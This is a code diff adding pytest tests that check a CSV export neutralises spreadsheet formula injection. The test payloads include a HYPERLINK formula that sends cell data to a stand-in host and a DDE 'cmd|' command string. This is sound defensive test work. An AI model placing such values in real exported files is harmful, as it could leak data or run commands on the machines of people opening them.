@@ -278,3 +278,39 @@ def _empty_git(path: Path) -> Path:
         capture_output=True,
     )
     return path
+
+
+@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r"])
+def test_csv_neutralises_formula_cells_from_corpus_strings(tmp_path: Path, lead: str) -> None:
+    """J-4: an authored threat_id (or other string) cannot become a spreadsheet formula."""
+    from joint_eval.paired_runner import write_paired
+
+    document = run_paired(root=ROOT)
+    payload = f'{lead}HYPERLINK("https://example.invalid/?"&A1,"x")'
+    document["rows"][0]["threat_id"] = payload
+    document["rows"][0]["kind"] = f"{lead}1+1"
+    document["rows"][0]["arms"]["PEP"]["path"] = f"{lead}cmd|' /C calc'!A0"
+    json_path, csv_path = write_paired(document, tmp_path / "p.json")
+    with csv_path.open(encoding="utf-8", newline="") as handle:
+        records = list(csv.DictReader(handle))
+    first = [record for record in records if record["threat_id"].endswith(payload[1:])]
+    assert len(first) == 3
+    for record in first:
+        assert record["threat_id"] == "'" + payload
+        assert record["kind"] == f"'{lead}1+1"
+    pep = next(record for record in first if record["arm"] == "PEP")
+    assert pep["path"] == f"'{lead}cmd|' /C calc'!A0"
+    for record in records:
+        for value in record.values():
+            assert not value.startswith(("=", "+", "-", "@", "\t", "\r")), record
+    # JSON keeps the authored strings; only the CSV writer neutralises.
+    assert json.loads(json_path.read_text(encoding="utf-8"))["rows"][0]["threat_id"] == payload
+
+
+def test_csv_leaves_a_negative_delta_numeric() -> None:
+    from joint_eval.paired_runner import _csv_text
+
+    document = run_paired(root=ROOT)
+    document["rows"][0]["arms"]["PEP"]["delta"] = -1
+    records = list(csv.DictReader(_csv_text(document).splitlines()))
+    assert any(record["delta"] == "-1" for record in records)
